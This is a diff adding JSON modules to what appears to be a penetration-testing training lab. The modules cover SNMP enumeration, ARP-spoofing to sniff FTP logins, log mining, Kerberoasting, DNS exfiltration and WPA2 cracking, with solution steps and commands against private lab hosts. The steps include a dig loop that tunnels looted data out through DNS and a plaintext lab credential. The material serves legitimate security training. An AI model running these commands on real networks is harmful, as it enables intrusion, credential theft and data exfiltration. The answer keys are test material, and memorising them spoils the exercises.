+      "hint": "Targets: net-01 (172.28.20.40), a device that overshares over SNMP, and ws-02 (172.28.20.61), a workstation that keeps logging into FTP in cleartext you can get between.",
+      "solution": [
+        "SNMP: enumerate the device at 172.28.20.40. snmpwalk -v2c -c public 172.28.20.40 dumps the public view; try the private community as well for writable OIDs.",
+        "MITM: the victim ws-02 (172.28.20.61) repeatedly logs into the Linux target over FTP. Position between them with ettercap or bettercap ARP spoofing.",
+        "Capture the traffic with tcpdump or Wireshark and read the cleartext FTP username and password off the wire.",
+        "Mark this module done."
+      ]
+    },
+    {
+      "id": "ent-syslog",
+      "title": "Log Mining",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 12,
+      "grading": "flag",
+      "flag_var": "MODULE_ENT_SYSLOG_FLAG",
+      "target": null,
+      "objective": "Applications log things they should not, and central logs aggregate them all. Read the exported logs on the collector, find the credential an app wrote in cleartext, and the audit token.",
+      "hint": "Target: log-01 (172.28.20.110), the log collector; it publishes its export read-only over HTTP. Grep it for passwords and tokens.",
+      "solution": [
+        "Pull the exported log from Kali: curl http://172.28.20.110/app.log",
+        "It contains a cleartext DB credential (reporting / Rep0rting#2024) and an audit integrity token.",
+        "Submit the integrity token (PENTESTTV{...}). The leaked DB credential is reusable."
+      ]
+    },
+    {
+      "id": "ent-krb",
+      "title": "Kerberoasting (offline)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 11,
+      "grading": "flag",
+      "flag_var": "MODULE_ENT_KRB_FLAG",
+      "target": null,
+      "objective": "Service accounts with Kerberos SPNs can be roasted: request a service ticket and crack it offline to recover the account's password. This one is pre-captured for you. The service ticket (TGS-REP) is on your Kali box at /root/captures/kerberoast.txt (use this file, not the Wi-Fi handshake in the same folder). Crack it offline against the lab wordlist to recover the service password.",
+      "hint": "Crack it with John's Kerberos format (john --format=krb5tgs) or hashcat -m 13100. The ticket is encrypted with the service account's password hash, so the right wordlist recovers it directly. Submit the recovered password exactly as cracked.",
+      "solution": [
+        "On your local Kali, use the captured Kerberos service ticket for this module: /root/captures/kerberoast.txt. Pick this file, not the Wi-Fi handshake capture that also lives under /root/captures. Crack it offline with John against the lab wordlist: john --format=krb5tgs --wordlist=/usr/share/wordlists/lab-passwords.txt /root/captures/kerberoast.txt",
+        "Show the result: john --show --format=krb5tgs /root/captures/kerberoast.txt. It recovers the svc_sql service account password.",
+        "Submit that password as the flag. (hashcat -m 13100 cracks this same ticket; either tool works.)",
+        "In a real domain you would request this ticket live with GetUserSPNs against a domain controller; here it is provided so the exercise is self-contained."
+      ]
+    },
+    {
+      "id": "10b-exfil",
+      "title": "Data Exfiltration (DNS)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 12,
+      "grading": "manual",
+      "target": null,
+      "objective": "Get data out the quiet way. Take data you have looted and tunnel it out of the network inside DNS queries to the lab's name server, a channel that often sails past egress controls.",
+      "hint": "Target: dns-01 (172.28.10.34), which answers any name under exfil.pentesttv.local. Encode your looted data into query labels and send it out as a series of lookups.",
+      "solution": [
+        "Encode a small secret on the host you control: echo 'secret data' | base64",
+        "Send it out as DNS labels to the lab name server, one chunk per query: for c in $(echo -n <encoded> | fold -w30); do dig +short $c.exfil.pentesttv.local @172.28.10.34; done",
+        "The queries resolve (an answer, not NXDOMAIN), confirming the channel reaches the server. In a real engagement a listener on the authoritative server reassembles the labels into the original data.",
+        "That is DNS exfiltration. For a full automated tunnel, tools like dnscat2 or iodine handle the encoding and reassembly. Mark this module done."
+      ]
+    },
+    {
+      "id": "13-wireless",
+      "title": "Wireless Handshake Cracking",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 13,
+      "grading": "flag",
+      "flag_var": "MODULE_13_WIFI_FLAG",
+      "target": null,
+      "objective": "You cannot capture radio in a container, so the capture is provided: a real WPA2 four-way handshake on your Kali box at /root/captures/wpa-handshake.pcap (SSID PentestTV-Corp; use this file, not the Kerberos ticket in the same folder). Crack it offline against the lab wordlist to recover the Wi-Fi passphrase, which is your flag.",
+      "hint": "Point aircrack-ng at the .pcap with -w <wordlist>; the passphrase appears on the KEY FOUND line. For GPU speed, crack the .22000 file with hashcat -m 22000 instead. It is a short WPA2 passphrase, so the lab wordlist is enough.",
+      "solution": [
+        "The handshake is at /root/captures/wpa-handshake.pcap (SSID PentestTV-Corp). Crack it with aircrack-ng and the lab wordlist: aircrack-ng -w /usr/share/wordlists/lab-passwords.txt /root/captures/wpa-handshake.pcap",
+        "aircrack-ng prints the passphrase on the KEY FOUND line. The full rockyou list also works.",
+        "Alternatively crack the provided hash with hashcat: hashcat -m 22000 /root/captures/wpa-handshake.22000 /usr/share/wordlists/lab-passwords.txt",
+        "Submit the recovered Wi-Fi passphrase as the flag."
+      ]
+    },
+    {
+      "id": "ent-vault",
+      "title": "Deep Pivot to the Restricted Segment",
+      "phase": "Restricted · Crown Jewels",
+      "chapter": 11,
+      "grading": "flag",
+      "flag_var": "MODULE_ENT_VAULT_FLAG",
+      "target": null,
+      "objective": "The crown jewels sit in a segment your attack box cannot reach at all. Use the operations credentials you recovered to reach the jump host, then pivot a second time to the vault and read the final flag.",
+      "hint": "Target: vault-01 (172.28.30.20), on a restricted network reachable only from the jump host jump-01 (172.28.20.100). You recovered the opsadmin credential from the wiki; use it to reach the jump host first.",
+      "solution": [
+        "SSH to the jump host with the operations account: ssh opsadmin@172.28.20.100 (password from the wiki runbook).",
+        "Read the handover notes there: cat ~/handover-notes.txt. They give the vault account svc_vault and its password.",
+        "From the jump host, pivot to the vault (reachable only from here): ssh svc_vault@172.28.30.20",
+        "Read the final flag: cat ~/loot/vault_flag.txt, and submit it."
+      ]
+    }
+  ],
+  "book2": {
+    "title": "The Basics of Hacking and Penetration Testing, 3rd Edition",
+    "subtitle": "Ethical Hacking and Penetration Testing Made Easy",
+    "author": "Thomas Wilhelm & Patrick Engebretson",
+    "url": "https://link.amazon/B03E3IYWn",
+    "cover": "book-basics.jpg",
+    "blurb": "A gentler on-ramp to the field. Where Professional Penetration Testing runs deep, this one starts from the fundamentals, the tools, the process, and the mindset, and makes a solid primer before or alongside the lab."
+  }
+}
